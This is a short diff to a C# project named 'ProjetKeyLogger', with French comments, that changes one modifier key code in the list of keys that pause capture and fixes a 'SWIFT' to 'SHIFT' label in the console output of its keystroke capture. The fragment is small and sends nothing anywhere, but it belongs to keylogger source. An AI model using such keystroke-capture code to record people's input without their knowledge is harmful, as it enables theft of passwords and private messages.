@@ -68,7 +68,7 @@ namespace ProjetKeyLogger
 
                 //liste des touches pour lesquelles la saisie est intérrompue
                 //Si une de ces touches est enfoncé, la capture est intérompu exemple : "ctrl + c" la lettre "c" n'est pas capturé
-                int[] list_non_accepte = new int[] { 17 ,18 ,91,16};
+                int[] list_non_accepte = new int[] { 17 ,18 ,91,160};
 
                 //le tableau des touches d'interruptions de la capture est parcouru
                 for (int i = 0; i < list_non_accepte.Length; i++)
@@ -105,7 +105,7 @@ namespace ProjetKeyLogger
                                 break;
 
                             case 16:
-                                Console.Write("SWIFT");
+                                Console.Write("SHIFT");
                                 break;
 
                             //si touche majuscule
